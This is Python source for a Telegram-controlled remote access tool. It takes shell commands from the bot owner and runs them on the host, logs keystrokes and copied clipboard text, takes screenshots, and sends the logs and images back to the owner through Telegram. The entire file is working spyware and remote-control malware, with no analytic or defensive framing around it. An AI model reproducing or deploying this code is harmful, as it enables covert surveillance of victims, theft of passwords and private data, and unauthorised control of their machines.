from telegram.ext import Updater
from telegram.ext import CommandHandler
from telegram.ext import MessageHandler
from telegram.ext import Filters
from pynput import keyboard
from functools import wraps
from mss import mss
import os
from subprocess import PIPE, STDOUT, Popen
import threading
import pyperclip

def restricted(func):
	@wraps(func)
	def wrapped(bot, update, *args, **kwargs):
		user_id = update.effective_user.id
		if user_id != admin_id:
			chat_id = str(update.message.chat_id)
			name = str(update.message.from_user.first_name) + ' ' + str(update.message.from_user.last_name)
			username = str(update.message.from_user.username)
			message = 'Someone tried to use me, master.\nUser ID: ' + user_id + '\nName: ' + name + '\nUsername: ' + username
			bot.send_message(chat_id=chat_id, text='You\'re not my master! Get out now!!!')
			bot.send_message(chat_id=admin_id, text=message)
			return
		return func(bot, update, *args, **kwargs)
	return wrapped

def on_press(key):
    global temps
    global keylog

    try:
        keylog += key.char
        temps.append(key.char)
    except AttributeError:
        keylog += ' '+key.name+' '
        temps.append(key.name)
    with open('logfile.txt', 'a') as logfile:
        logfile.write(keylog)
    keylog = ''

def on_release(key):
    global temps
    global keylog
    global clip

    if len(temps) == 2 and (temps[0]  in {'ctrl_l', 'ctrl', 'ctrl_r'} and temps[1].lower() == 'c'):
        clip += '\n##############################\n' + pyperclip.paste() + '\n##############################\n'
        with open('logfile.txt', 'a') as logfile:
            logfile.write(clip)
        clip = ''
    temps = []

def shutdown():
	updater.stop()
	updater.is_idle = False

@restricted
def start(bot, update):
	bot.send_message(chat_id=admin_id, text="Hello World!!")

@restricted
def stop(bot, update):
	bot.send_message(chat_id=admin_id, text="Okay, stopping...")
	threading.Thread(target=shutdown).start()

@restricted
def cmd(bot, update, args):
	cmdresult = Popen(' '.join(args), shell=True, stdout=PIPE, stderr=STDOUT)
	data = (cmdresult.stdout.read()).decode()
	bot.send_message(chat_id=admin_id, text=data)

@restricted
def keylogger(bot, update, args):
	global listener
	global keylogger_on
	if args[0] == 'start':
		if  keylogger_on:
			bot.send_message(chat_id=admin_id, text='The keylogger is already in execution!')
			return False
		keylogger_on = True
		bot.send_message(chat_id=admin_id, text='Starting keylogger now...')
		listener = keyboard.Listener(on_press = on_press, on_release=on_release)
		listener.start()
	elif args[0] == 'stop':
		if  not keylogger_on:
			bot.send_message(chat_id=admin_id, text='The keylogger is not active!')
			return False
		keylogger_on = False
		bot.send_message(chat_id=admin_id, text='Okay, shutting down the keylogger...')
		listener.stop()
		bot.send_document(chat_id=admin_id, document=open('logfile.txt','rb'))
		os.system('del logfile.txt')
	else:
		bot.send_message(chat_id=admin_id, text='Can\'t understand this argument! Try again!')

@restricted
def ss(bot, update):
	with mss() as sct:
		sct.shot(mon=-1,output='print.png')
	bot.send_photo(chat_id=admin_id, photo=open('print.png','rb'))
	os.system('del print.png')

@restricted
def unknown(bot, update):
	bot.send_message(chat_id=admin_id, text="404 - Command Not Found")


if __name__ == '__main__':
	with open('auth.txt','r') as authfile:
		my_token,admin_id = authfile.read().split(',')
		admin_id = int(admin_id)

	updater = Updater(token=my_token)
	dispatcher = updater.dispatcher

	clip = ''
	keylog = ''
	temps = []
	keylogger_on = False

	start_handler = CommandHandler('start', start)
	stop_handler = CommandHandler('stop', stop)
	cmd_handler = CommandHandler('cmd', cmd, pass_args=True)
	keylogger_handler = CommandHandler('keylogger', keylogger, pass_args=True)
	ss_handler = CommandHandler('ss', ss)
	unknown_handler = MessageHandler(Filters.command, unknown)
	dispatcher.add_handler(start_handler)
	dispatcher.add_handler(stop_handler)
	dispatcher.add_handler(cmd_handler)
	dispatcher.add_handler(keylogger_handler)
	dispatcher.add_handler(ss_handler)
	dispatcher.add_handler(unknown_handler)

	try:
		updater.start_polling()
		updater.idle()
	except KeyboardInterrupt:
		shutdown()
